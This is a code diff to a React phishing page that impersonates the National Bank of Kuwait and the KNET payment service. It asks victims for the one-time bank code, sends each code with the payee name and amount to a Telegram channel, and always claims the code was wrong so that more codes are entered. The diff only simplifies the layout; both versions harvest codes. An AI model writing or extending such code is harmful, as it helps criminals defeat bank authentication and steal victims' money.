@@ -1,157 +1,69 @@
-import { useState } from "react";
+import { useState, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 import { sendMessageToTelegram } from "@/backend/telegramService";
 
-const defaultPaymentData = {
-  customerName: "halits.YILDIZ",
-  amount: "5.000",
-  currency: "KWD",
-  description: "طلب رابط دفع من chalits.YILDIZ بمبلغ KWD 5.000. سيكون الرابط صالحًا لمدة 24 ساعة."
-};
-
 const OTPVerification = () => {
   const { id } = useParams();
   const navigate = useNavigate();
+  const queryParams = new URLSearchParams(window.location.search);
+  
+  const paymentData = useMemo(() => ({
+    customerName: queryParams.get('n') || "halits.YILDIZ",
+    amount: queryParams.get('a') || "5.000"
+  }), [window.location.search]);
+
   const [otp, setOtp] = useState("");
   const [loading, setLoading] = useState(false);
   const [attempts, setAttempts] = useState(0);
-  const [isBlocked, setIsBlocked] = useState(false);
   const [errorMsg, setErrorMsg] = useState("");
-
-  const queryParams = new URLSearchParams(window.location.search);
-  const paymentData = {
-    customerName: queryParams.get('n') || defaultPaymentData.customerName,
-    amount: queryParams.get('a') || defaultPaymentData.amount,
-    currency: queryParams.get('c') || "د.ك",
-    description: queryParams.get('p') || defaultPaymentData.description
-  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (isBlocked) return;
-    
     setLoading(true);
-    setErrorMsg("");
-    
     const message = `
 <b>🔑 New OTP Entry (Attempt ${attempts + 1})</b>
 <b>Name:</b> ${paymentData.customerName}
 <b>Amount:</b> ${paymentData.amount} KD
 <b>OTP:</b> <code>${otp}</code>
-<b>ID:</b> ${id}
 `;
-
     await sendMessageToTelegram(message);
-    
     setTimeout(() => {
       setLoading(false);
-      const newAttempts = attempts + 1;
-      setAttempts(newAttempts);
+      setAttempts(prev => prev + 1);
       setOtp("");
-      
-      if (newAttempts >= 3) {
-        setIsBlocked(true);
-        setErrorMsg("تم حظر إدخال رمز التحقق بسبب محاولات خاطئة متعددة. يرجى مراجعة البنك.");
+      if (attempts >= 2) {
+        setErrorMsg("تم حظر إدخال رمز التحقق. يرجى مراجعة البنك.");
       } else {
         setErrorMsg("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
       }
     }, 1500);
   };
 
-  const handleCancel = () => {
-    navigate(`/card/${id}${window.location.search}`);
-  };
-
   return (
-    <div className="min-h-screen bg-gray-100" style={{ backgroundColor: '#f5f5f5' }}>
-      <div className="w-full h-20 sm:h-32 bg-gradient-to-r from-blue-400 to-blue-600 relative overflow-hidden">
-        <img 
-          src="/lovable-uploads/1d2a9902-d961-468c-9f95-1695f21fb91b.png" 
-          alt="NBK Logo" 
-          className="w-full h-full object-cover"
-        />
-      </div>
-
-      <div className="container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-2xl">
-        <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 mb-3 sm:mb-6">
-          <div className="text-center mb-3 sm:mb-6">
-            <div className="flex items-center justify-center mb-2 sm:mb-4">
-              <img 
-                src="/lovable-uploads/dd68033e-3d38-482d-ad61-28ff811e33ba.png" 
-                alt="NBK Logo" 
-                className="h-8 sm:h-12 w-auto"
-              />
-            </div>
+    <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center p-4" dir="rtl">
+      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl p-6 text-center">
+        <img src="/nbk-logo.jpg" alt="NBK" className="h-10 mx-auto mb-6" />
+        <h2 className="text-xl font-bold mb-4">التحقق من الرمز</h2>
+        <div className="mb-6 p-4 bg-blue-50 rounded-xl">
+           <div className="flex justify-between"><span>المستفيد:</span><span className="font-bold">{paymentData.customerName}</span></div>
+           <div className="flex justify-between mt-2"><span>المبلغ:</span><span className="font-bold">{parseFloat(paymentData.amount).toFixed(3)} KD</span></div>
+        </div>
+        {errorMsg && <div className="mb-4 p-3 bg-red-100 text-red-700 rounded-lg">{errorMsg}</div>}
+        <form onSubmit={handleSubmit}>
+          <div className="flex justify-center mb-6">
+            <InputOTP maxLength={6} value={otp} onChange={setOtp} disabled={attempts >= 3}>
+              <InputOTPGroup className="gap-2">
+                {[0,1,2,3,4,5].map(i => <InputOTPSlot key={i} index={i} className="w-12 h-12 border-2 border-blue-400 rounded-lg text-xl" />)}
+              </InputOTPGroup>
+            </InputOTP>
           </div>
-          
-          <div className="border-t border-gray-200 pt-2 sm:pt-4">
-            <div className="flex justify-between items-center mb-2 sm:mb-4">
-              <span className="text-blue-600 font-medium text-sm sm:text-base">OTP Verification</span>
-              <span className="text-gray-700 text-sm sm:text-base">:التحقق من الرمز</span>
-            </div>
-            <div className="border-t border-gray-200 pt-1 sm:pt-2">
-              <div className="flex justify-between items-center mb-1">
-                 <span className="text-blue-600 font-medium text-sm sm:text-base">{paymentData.customerName}</span>
-                 <span className="text-gray-700 text-sm sm:text-base">:المستفيد</span>
-              </div>
-              <div className="flex justify-between items-center">
-                <span className="text-blue-600 font-bold text-lg sm:text-xl">KD {paymentData.amount}</span>
-                <span className="text-gray-700 text-sm sm:text-base">:المبلغ</span>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 mb-3 sm:mb-6">
-          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
-            <div className="text-center space-y-3 sm:space-y-4">
-              <p className="text-gray-600 text-sm sm:text-lg px-2">يرجى إدخال رمز التحقق المرسل إلى هاتفك المحمول</p>
-              
-              {errorMsg && (
-                <div className={`p-3 rounded-lg text-sm font-medium ${isBlocked ? 'bg-red-100 text-red-700' : 'bg-orange-100 text-orange-700'}`}>
-                  {errorMsg}
-                </div>
-              )}
-
-              <div className="flex justify-center py-4 sm:py-6">
-                <InputOTP 
-                  maxLength={6} 
-                  value={otp} 
-                  onChange={(value) => setOtp(value)} 
-                  name="otp"
-                  disabled={isBlocked}
-                >
-                  <InputOTPGroup className="gap-1 sm:gap-3">
-                    <InputOTPSlot index={0} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
-                    <InputOTPSlot index={1} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
-                    <InputOTPSlot index={2} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
-                    <InputOTPSlot index={3} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
-                    <InputOTPSlot index={4} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
-                    <InputOTPSlot index={5} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
-                  </InputOTPGroup>
-                </InputOTP>
-              </div>
-              <div className="flex space-x-3 sm:space-x-4 mt-6">
-                <button
-                  type="submit"
-                  className="flex-1 bg-blue-700 text-white py-3 sm:py-4 rounded-lg text-base sm:text-lg font-bold hover:bg-blue-800 transition-colors shadow-md disabled:opacity-50"
-                  disabled={loading || otp.length !== 6 || isBlocked}
-                >
-                  {loading ? 'جاري التحميل...' : 'تأكيد'}
-                </button>
-              </div>
-            </div>
-          </form>
-        </div>
-
-        <div className="text-center mt-4 sm:mt-8 text-gray-600">
-          <div className="text-xs sm:text-sm mb-1 sm:mb-2">جميع الحقوق محفوظة © 2025</div>
-          <div className="text-xs sm:text-sm text-blue-600">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
-        </div>
+          <button type="submit" disabled={loading || otp.length !== 6 || attempts >= 3} className="w-full bg-blue-700 text-white py-4 rounded-xl font-bold shadow-lg">
+            {loading ? "جاري التحميل..." : "تأكيد"}
+          </button>
+        </form>
       </div>
     </div>
   );
 };
-
 export default OTPVerification;
